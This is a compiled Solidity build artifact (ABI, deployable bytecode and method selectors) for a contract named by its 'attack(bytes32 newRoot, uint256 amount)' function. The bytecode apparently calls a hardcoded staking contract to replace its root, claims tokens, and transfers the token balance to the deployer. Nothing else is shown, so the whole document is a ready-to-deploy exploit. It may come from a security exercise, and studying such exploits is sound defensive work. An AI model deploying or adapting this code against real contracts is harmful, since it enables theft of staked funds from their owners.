{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[{"name":"newRoot","type":"bytes32","internalType":"bytes32"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getStakingContractBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getTokenBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"}],"bytecode":{"object":"0x60a080604052346022573360805261053990816100278239608051816102400152f35b5f80fdfe60806040526004361015610011575f80fd5b5f3560e01c806335542bb71461007a57806382b2e257146100605763c486ad371461003a575f80fd5b3461005c575f36600319011261005c57602061005461046f565b604051908152f35b5f80fd5b3461005c575f36600319011261005c5760206100546103e0565b3461005c57604036600319011261005c576100996024356004356100d1565b005b90601f8019910116810190811067ffffffffffffffff8211176100bd57604052565b634e487b7160e01b5f52604160045260245ffd5b5f90733f4d749675b3e48bccd932033808a7079328eb483b1580156103c3575b6103be57733f4d749675b3e48bccd932033808a7079328eb483b1561005c5760405190634783f0ef60e01b825260048201525f8160248183733f4d749675b3e48bccd932033808a7079328eb485af180156103b3576103a0575b5060209160405161015c848261009b565b8281525f368137733f4d749675b3e48bccd932033808a7079328eb483b1561039c5790826040518093632f52ebb760e01b8252604482019360048301526040602483015280518094528660648301910193835b888282106103825750505081929350038183733f4d749675b3e48bccd932033808a7079328eb485af1801561037757908291610362575b50506040516370a0823160e01b815230600482015290828260248173ba5bde662c17e2adff1075610382b9b6912963505afa918215610326578192610333575b508161023157505050565b60405163a9059cbb60e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166004820152602481019290925282826044818473ba5bde662c17e2adff1075610382b9b6912963505af19182156103265781926102e5575b5050156102aa5750565b6064906040519062461bcd60e51b8252600482015260146024820152731490549157d514905394d1915497d1905253115160621b6044820152fd5b9091508281813d831161031f575b6102fd818361009b565b8101031261031b575190811515820361031857505f806102a0565b80fd5b5080fd5b503d6102f3565b50604051903d90823e3d90fd5b9091508281813d831161035b575b61034b818361009b565b8101031261005c5751905f610226565b503d610341565b8161036c9161009b565b61031857805f6101e6565b6040513d84823e3d90fd5b8651845295860195889550879450909201916001016101af565b8280fd5b6103ac91505f9061009b565b5f5f61014b565b6040513d5f823e3d90fd5b505050565b5073ba5bde662c17e2adff1075610382b9b6912963503b156100f1565b73ba5bde662c17e2adff1075610382b9b6912963503b1561046b576040516370a0823160e01b815230600482015260208160248173ba5bde662c17e2adff1075610382b9b6912963505afa9081156103b3575f9161043c575090565b90506020813d602011610463575b816104576020938361009b565b8101031261005c575190565b3d915061044a565b5f90565b733f4d749675b3e48bccd932033808a7079328eb483b1580156104e6575b61046b576040516370a0823160e01b8152733f4d749675b3e48bccd932033808a7079328eb48600482015260208160248173ba5bde662c17e2adff1075610382b9b6912963505afa9081156103b3575f9161043c575090565b5073ba5bde662c17e2adff1075610382b9b6912963503b1561048d56fea2646970667358221220a73ce3ae36943490f10840cdc116c4ca12a27770af4737b88cbb512ad36ffaa764736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attack(bytes32,uint256)":"35542bb7","getStakingContractBalance()":"c486ad37","getTokenBalance()":"82b2e257"},"id":0}